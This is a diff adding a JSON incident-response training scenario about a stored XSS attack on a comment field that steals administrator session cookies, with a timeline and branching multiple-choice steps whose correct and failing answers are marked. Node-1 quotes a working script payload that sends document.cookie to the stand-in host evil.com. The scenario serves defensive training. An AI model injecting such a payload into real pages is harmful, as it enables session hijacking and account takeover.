@@ -1,0 +1,154 @@
+{
+  "title": "xss",
+  "description": "A stored XSS payload injected into a public comment field executes in admin browsers, stealing session cookies and hijacking administrator accounts.",
+  "timeline": [
+    {
+      "index": 0,
+      "title": "Admin Session Anomaly",
+      "description": "SIEM detects admin account logins from unfamiliar IP addresses. Admins report not recognising recent actions performed in their accounts.",
+      "timeOffsetSec": 5
+    },
+    {
+      "index": 1,
+      "title": "XSS Payload Identified",
+      "description": "Security review of the comment database finds a stored JavaScript payload that exfiltrates document.cookie to an external server.",
+      "timeOffsetSec": 20
+    },
+    {
+      "index": 2,
+      "title": "Session Tokens Stolen",
+      "description": "External server logs show admin session tokens being received. Four admin accounts are confirmed compromised via cookie theft.",
+      "timeOffsetSec": 60
+    },
+    {
+      "index": 3,
+      "title": "Payload Removed, Sessions Invalidated",
+      "description": "Malicious comment deleted. All admin sessions invalidated. Admin accounts locked pending credential resets.",
+      "timeOffsetSec": 120
+    },
+    {
+      "index": 4,
+      "title": "Output Encoding Deployed",
+      "description": "Developer patches all user-supplied content rendering to use context-aware output encoding. CSP header added.",
+      "timeOffsetSec": 180
+    },
+    {
+      "index": 5,
+      "title": "Security Testing Complete",
+      "description": "XSS scanner run across all input fields. No additional vulnerabilities found. Incident closed with lessons learned documented.",
+      "timeOffsetSec": 300
+    }
+  ],
+  "root": "node-1",
+  "nodes": {
+    "node-1": {
+      "title": "Admin Accounts Behaving Anomalously",
+      "situation": "SIEM alerts show admin account activity from unfamiliar IPs. Two admins report actions in their accounts they did not perform. You discover a stored JavaScript payload in the product comment section: <script>fetch('https://evil.com/?c='+document.cookie)</script>",
+      "question": "What is your immediate action?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Invalidate all admin sessions immediately, delete the malicious comment, and lock admin accounts pending investigation and password resets.",
+          "outcome": {
+            "type": "node",
+            "target": "node-2"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Edit the malicious comment to remove the script tag while keeping sessions active to avoid disrupting administrators.",
+          "outcome": {
+            "type": "failure"
+          }
+        },
+        {
+          "label": "C",
+          "text": "Block the external IP receiving the stolen cookies and continue monitoring without touching the XSS payload.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-2": {
+      "title": "Determine Actions Taken by Attackers",
+      "situation": "Four admin accounts had their session tokens stolen. The attackers used these sessions for up to 2 hours. You must determine what privileged actions were performed during the hijacked sessions.",
+      "question": "How do you investigate the session hijacking impact?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Review the audit logs for all four compromised admin accounts during the hijacking window to identify unauthorised changes, data access, or account modifications.",
+          "outcome": {
+            "type": "node",
+            "target": "node-3"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Reset the admin passwords and assume no serious changes were made since admins would have noticed immediately.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-3": {
+      "title": "Remediate the XSS Vulnerability",
+      "situation": "Audit logs show attackers browsed user data and exported a customer list. The XSS vulnerability must now be fixed. The root cause is unencoded output of user-supplied content in the comments section.",
+      "question": "How do you remediate the XSS vulnerability?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Apply context-aware output encoding (HTML entity encoding) for all user-supplied content, implement a strict Content Security Policy, and audit all input rendering points for similar issues.",
+          "outcome": {
+            "type": "node",
+            "target": "node-4"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Add a WAF rule to strip <script> tags from comments as the sole remediation measure.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-4": {
+      "title": "Implement Ongoing XSS Protections",
+      "situation": "The immediate vulnerability is patched. Now you need to implement developer training and tooling to prevent future XSS vulnerabilities from being introduced.",
+      "question": "What do you implement for long-term prevention?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Integrate XSS-focused SAST rules into CI/CD, enforce HttpOnly and Secure cookie flags for all session tokens, and conduct developer secure coding training.",
+          "outcome": {
+            "type": "node",
+            "target": "node-5"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Rely on the CSP header alone to mitigate future XSS without changing development practices or cookie attributes.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-5": {
+      "title": "Scenario Complete",
+      "situation": "The stored XSS attack was contained. Compromised admin sessions were invalidated, the payload removed, and the vulnerability patched with context-aware output encoding and CSP. Ongoing SAST, HttpOnly cookies, and developer training now prevent recurrence.",
+      "question": "Scenario complete. Well done!",
+      "options": []
+    }
+  },
+  "category": "Web",
+  "difficulty": "Intermediate",
+  "tags": [
+    "XSS",
+    "cross-site scripting",
+    "web",
+    "session theft"
+  ]
+}
